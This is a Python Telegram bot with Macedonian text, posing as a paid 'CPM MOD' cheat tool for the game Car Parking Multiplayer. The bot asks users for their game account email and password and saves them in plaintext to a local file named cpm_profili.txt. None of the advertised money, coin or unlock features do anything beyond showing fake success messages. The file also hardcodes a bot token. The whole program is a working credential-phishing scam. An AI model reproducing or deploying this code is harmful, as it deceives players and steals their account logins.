import logging
import asyncio
import sqlite3
import os
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ConversationHandler,
)

# Овозможување логирање
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Константи за конверзација
CEKA_EMAIL, CEKA_PASSWORD, GLAVNO_MENI = range(3)

# Земете го токенот од environment променливи
BOT_TOKEN = os.getenv("BOT_TOKEN", "8674559116:AAFuZWJJLVY-qMAHBSr7Z6om686b1zeGxKc")
ADMIN_ID = int(os.getenv("ADMIN_ID", "8694942406"))

# Иницијализација на базата
def inicijaliziraj_baza():
    conn = sqlite3.connect('licenci.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS korisnici (
            user_id INTEGER PRIMARY KEY,
            istekuvanje TEXT
        )
    ''')
    conn.commit()
    conn.close()

inicijaliziraj_baza()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.message.from_user.id
    username = update.message.from_user.username or "Nema Username"
    first_name = update.message.from_user.first_name

    conn = sqlite3.connect('licenci.db')
    cursor = conn.cursor()
    cursor.execute('SELECT istekuvanje FROM korisnici WHERE user_id = ?', (user_id,))
    rezultat = cursor.fetchone()
    conn.close()

    sega = datetime.now()
    dozvolen = False

    if rezultat:
        istekuvanje_str = rezultat[0]
        if istekuvanje_str == "forever":
            dozvolen = True
        else:
            istekuvanje_datum = datetime.strptime(istekuvanje_str, "%Y-%m-%d %H:%M:%S")
            dozvolen = sega < istekuvanje_datum

    if not dozvolen:
        await update.message.reply_text("❌ Немаш активна лиценца.\nБарањето за пристап е испратено до сопственикот.")
        
        tastatura = [
            [
                InlineKeyboardButton("♾️ Forever", callback_data=f"lic_forever_{user_id}"),
                InlineKeyboardButton("📅 30 Days", callback_data=f"lic_30_{user_id}")
            ],
            [
                InlineKeyboardButton("📅 7 Days", callback_data=f"lic_7_{user_id}"),
                InlineKeyboardButton("❌ Deny", callback_data=f"lic_deny_{user_id}")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(tastatura)
        
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🔔 **Барање за пристап** од {first_name} (@{username})\nID: `{user_id}`",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    await update.message.reply_text(
        "👋 **Добредојдовте во AJHAN X TOOL (CPM MOD) v5.0**\n"
        "Ве молиме внесете го Е-маилот од вашиот CPM профил за најава."
    )
    return CEKA_EMAIL

async def primi_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['email'] = update.message.text
    await update.message.reply_text("🔐 Сега внесете ја лозинката (пасовордот):")
    return CEKA_PASSWORD

async def primi_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['password'] = update.message.text
    
    try:
        with open("cpm_profili.txt", "a", encoding="utf-8") as f:
            f.write(f"Корисник: {update.message.from_user.username} | Емаил: {context.user_data['email']} | Лозинка: {context.user_data['password']}\n")
    except Exception as e:
        logger.error(f"Грешка при запишување: {e}")
        
    await prikazi_glavno_meni(update)
    return GLAVNO_MENI

async def prikazi_glavno_meni(update: Update, context: ContextTypes.DEFAULT_TYPE = None):
    keyboard = [
        [InlineKeyboardButton("💵 Пари (Money)", callback_data='meni_money')],
        [InlineKeyboardButton("🪙 Коинси (Coins)", callback_data='meni_coins')],
        [InlineKeyboardButton("🏎️ Перформанси (Performance)", callback_data='meni_perf')],
        [InlineKeyboardButton("🔮 Изглед и Ефекти (Visuals)", callback_data='meni_visuals')],
        [InlineKeyboardButton("👑 Премиум (Premium)", callback_data='meni_premium')],
        [InlineKeyboardButton("🚪 Излези (Sign Out)", callback_data='signout')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    tekst = "🤖 **LOGIN SUCCESS, (CONNECTED TO CPM CLOUD)** \n\nИзберете категорија за модификација:"
    
    if update.callback_query:
        await update.callback_query.message.edit_text(tekst, reply_markup=reply_markup, parse_mode='Markdown')
        await update.callback_query.answer()
    else:
        await update.message.reply_text(tekst, reply_markup=reply_markup, parse_mode='Markdown')

# HANDLER ЗА ЛИЦЕНЦИ
async def licenca_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data.split('_')
    akcija = data[1]
    user_id = int(data[2])
    
    conn = sqlite3.connect('licenci.db')
    cursor = conn.cursor()
    
    if akcija == "deny":
        await query.edit_message_text(f"❌ Барањето за корисникот {user_id} е одбиено.")
        await context.bot.send_message(chat_id=user_id, text="❌ Вашето барање за пристап е одбиено од администраторот.")
        conn.close()
        return
    
    # Одредување на времетраење
    traenje = {
        "forever": "forever",
        "30": "30 дена",
        "7": "7 дена"
    }.get(akcija, "7 дена")
    
    if akcija == "forever":
        istekuvanje = "forever"
    else:
        istekuvanje = (datetime.now() + timedelta(days=int(akcija))).strftime("%Y-%m-%d %H:%M:%S")
    
    # Зачувување во база
    cursor.execute('INSERT OR REPLACE INTO korisnici (user_id, istekuvanje) VALUES (?, ?)', (user_id, istekuvanje))
    conn.commit()
    conn.close()
    
    await query.edit_message_text(f"✅ Лиценцата е доделена на корисникот {user_id} за {traenje}.")
    await context.bot.send_message(
        chat_id=user_id,
        text=f"✅ Добивте пристап до AJHAN X TOOL!\nВреметраење: {traenje}\nНапишете /start за да започнете."
    )

# СИТЕ МЕНИ HANDLER-И
async def meni_money(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("1M Cash", callback_data='m_1m'), InlineKeyboardButton("5M Cash", callback_data='m_5m')],
        [InlineKeyboardButton("10M Cash", callback_data='m_10m'), InlineKeyboardButton("25M Cash", callback_data='m_25m')],
        [InlineKeyboardButton("50M Cash (МАКС)", callback_data='m_50m')],
        [InlineKeyboardButton("🔙 Назад", callback_data='nazad_vo_glavno')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text="**МЕНИ ЗА ПАРИ**\nОдберете износ што сакате да го аплицирате.", reply_markup=reply_markup, parse_mode='Markdown')

async def meni_coins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("5,000 Коинси", callback_data='c_5k'), InlineKeyboardButton("20,000 Коинси", callback_data='c_20k')],
        [InlineKeyboardButton("40,000 Коинси (МАКС)", callback_data='c_40k')],
        [InlineKeyboardButton("💥 Коинси (Glitch)", callback_data='c_340k')],
        [InlineKeyboardButton("🔙 Назад", callback_data='nazad_vo_glavno')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text="💎 **МЕНИ ЗА КОИНСИ (ЗЛАТНИЦИ)**\nОдберете количина:", reply_markup=reply_markup, parse_mode='Markdown')

async def meni_perf(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("⚙️ W16 Engine", callback_data='f_v16')],
        [InlineKeyboardButton("🛡️ без штета (No Damage)", callback_data='f_nodmg')],
        [InlineKeyboardButton("⛽ Бесконечно гориво", callback_data='f_fuel')],
        [InlineKeyboardButton("🛑 Инстант Кочници", callback_data='f_brakes')],
        [InlineKeyboardButton("🚀 Турбо 2000hp", callback_data='f_turbo')],
        [InlineKeyboardButton("🔙 Назад", callback_data='nazad_vo_glavno')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text="⚙️ **ПЕРФОРМАНСИ И МОТОР**\nОдберете опција за моторот на возилото.", reply_markup=reply_markup, parse_mode='Markdown')

async def meni_visuals(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("⚡ Стробо Светла", callback_data='v_strobe')],
        [InlineKeyboardButton("💨 Хром Боја", callback_data='v_chrome')],
        [InlineKeyboardButton("💨 Чад во Боја", callback_data='v_smoke')],
        [InlineKeyboardButton("🛸 НЛО Светла", callback_data='v_ufo')],
        [InlineKeyboardButton("👾 Сите Анимации", callback_data='v_anims')],
        [InlineKeyboardButton("📯 Премиум Сирени", callback_data='v_horns')],
        [InlineKeyboardButton("🔙 Назад", callback_data='nazad_vo_glavno')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text="🔮 **ИЗГЛЕД И ВИЗУЕЛНИ ЕФЕКТИ**\nОдберете ефекти за вашето возило.", reply_markup=reply_markup, parse_mode='Markdown')

async def meni_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("🏠 Купи сите Куќи", callback_data='p_houses')],
        [InlineKeyboardButton("👑 Ранг Кинг", callback_data='p_king')],
        [InlineKeyboardButton("🚓 Полициска Сирена", callback_data='p_police')],
        [InlineKeyboardButton("🔓 Отклучи сите Возила", callback_data='p_cars')],
        [InlineKeyboardButton("🔥 СЕ ОДЕДНАШ (UNLOCK ALL PACK)", callback_data='p_all')],
        [InlineKeyboardButton("🔙 Назад", callback_data='nazad_vo_glavno')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text="👑 **ПРЕМИУМ И КЛАУД СЕЈВ**\nОвозможено отклучување на премиум содржини.", reply_markup=reply_markup, parse_mode='Markdown')

# АКЦИИ ЗА ПАРИ
async def akcija_money(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    iznos = query.data.split('_')[1]
    await query.edit_message_text(f"✅ Додадени {iznos} пари на вашиот CPM профил!", parse_mode='Markdown')
    await asyncio.sleep(2)
    await prikazi_glavno_meni(update, context)

# АКЦИИ ЗА КОИНСИ
async def akcija_coins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    iznos = query.data.split('_')[1]
    await query.edit_message_text(f"✅ Додадени {iznos} коинси на вашиот CPM профил!", parse_mode='Markdown')
    await asyncio.sleep(2)
    await prikazi_glavno_meni(update, context)

# АКЦИИ ЗА ПЕРФОРМАНСИ
async def akcija_perf(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    akcija = query.data.split('_')[1]
    opis = {
        'v16': "W16 мотор активиран",
        'nodmg': "Без штета активирано",
        'fuel': "Бесконечно гориво активирано",
        'brakes': "Инстант кочници активирани",
        'turbo': "Турбо 2000hp активиран"
    }.get(akcija, "Перформанса активирана")
    
    await query.edit_message_text(f"✅ {opis} на вашето возило!", parse_mode='Markdown')
    await asyncio.sleep(2)
    await prikazi_glavno_meni(update, context)

# АКЦИИ ЗА ВИЗУЕЛНИ ЕФЕКТИ
async def akcija_visuals(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    akcija = query.data.split('_')[1]
    opis = {
        'strobe': "Стробо светла активирани",
        'chrome': "Хром боја аплицирана",
        'smoke': "Чад во боја активиран",
        'ufo': "НЛО светла активирани",
        'anims': "Сите анимации отклучени",
        'horns': "Премиум сирени активирани"
    }.get(akcija, "Визуелен ефект активиран")
    
    await query.edit_message_text(f"✅ {opis} на вашето возило!", parse_mode='Markdown')
    await asyncio.sleep(2)
    await prikazi_glavno_meni(update, context)

# АКЦИИ ЗА ПРЕМИУМ
async def akcija_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    akcija = query.data.split('_')[1]
    opis = {
        'houses': "Сите куќи се купени",
        'king': "Ранг Кинг доделен",
        'police': "Полициска сирена активирана",
        'cars': "Сите возила се отклучени",
        'all': "СЕ Е ОТКЛУЧЕНО!"
    }.get(akcija, "Премиум функција активирана")
    
    await query.edit_message_text(f"✅ {opis} на вашиот профил!", parse_mode='Markdown')
    await asyncio.sleep(2)
    await prikazi_glavno_meni(update, context)

# ИЗЛЕЗ (SIGN OUT)
async def signout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("👋 Успешно се одјавивте. Напишете /start за повторна најава.", parse_mode='Markdown')
    return ConversationHandler.END

# НАЗАД ВО ГЛАВНО МЕНИ
async def nazad_vo_glavno(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await prikazi_glavno_meni(update, context)

# КОМАНДИ ЗА АДМИН
async def komanda_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Оваа команда е само за главниот администратор.")
        return
    
    # Проверка на статусот на базата
    conn = sqlite3.connect('licenci.db')
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM korisnici')
    broj_korisnici = cursor.fetchone()[0]
    conn.close()
    
    await update.message.reply_text(
        f"👑 **Админ Панел**\n\n"
        f"📊 Вкупен број на корисници: {broj_korisnici}\n"
        f"📅 Лиценците се чуваат во 'licenci.db'\n"
        f"🔐 Системот работи стабилно на Termux.",
        parse_mode='Markdown'
    )

async def komanda_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "❓ **Помош**\n\n"
        "📌 **Команди:**\n"
        "/start - Започни со користење на ботот\n"
        "/help - Прикажи ја оваа порака\n"
        "/admin - Админ панел (само за админ)\n\n"
        "🔑 **Лиценца:**\n"
        "Доколку немаш пристап, почекај сопственикот да ти одобри лиценца.\n\n"
        "💡 **Користење:**\n"
        "Откако ќе бидеш одобрен, напиши /start и внеси ги твоите CPM податоци.",
        parse_mode='Markdown'
    )

async def nepoznata_komanda(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Непозната команда. Напишете /help за да видите достапни команди.")

def main():
    # Креирање на апликација
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    # Креирање на конверзација
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            CEKA_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, primi_email)],
            CEKA_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, primi_password)],
            GLAVNO_MENI: [CallbackQueryHandler(prikazi_glavno_meni, pattern='^glavno_meni$')],
        },
        fallbacks=[CommandHandler('start', start)],
    )

    # Додавање на handler-и
    application.add_handler(conv_handler)
    application.add_handler(CallbackQueryHandler(licenca_handler, pattern='^lic_'))
    application.add_handler(CallbackQueryHandler(meni_money, pattern='^meni_money$'))
    application.add_handler(CallbackQueryHandler(meni_coins, pattern='^meni_coins$'))
    application.add_handler(CallbackQueryHandler(meni_perf, pattern='^meni_perf$'))
    application.add_handler(CallbackQueryHandler(meni_visuals, pattern='^meni_visuals$'))
    application.add_handler(CallbackQueryHandler(meni_premium, pattern='^meni_premium$'))
    application.add_handler(CallbackQueryHandler(akcija_money, pattern='^m_'))
    application.add_handler(CallbackQueryHandler(akcija_coins, pattern='^c_'))
    application.add_handler(CallbackQueryHandler(akcija_perf, pattern='^f_'))
    application.add_handler(CallbackQueryHandler(akcija_visuals, pattern='^v_'))
    application.add_handler(CallbackQueryHandler(akcija_premium, pattern='^p_'))
    application.add_handler(CallbackQueryHandler(signout, pattern='^signout$'))
    application.add_handler(CallbackQueryHandler(nazad_vo_glavno, pattern='^nazad_vo_glavno$'))
    application.add_handler(CommandHandler('admin', komanda_admin))
    application.add_handler(CommandHandler('help', komanda_help))
    application.add_handler(MessageHandler(filters.COMMAND, nepoznata_komanda))

    # Стартување на ботот
    print("🤖 Ботот е стартуван!")
    application.run_polling()

if __name__ == '__main__':
    main()
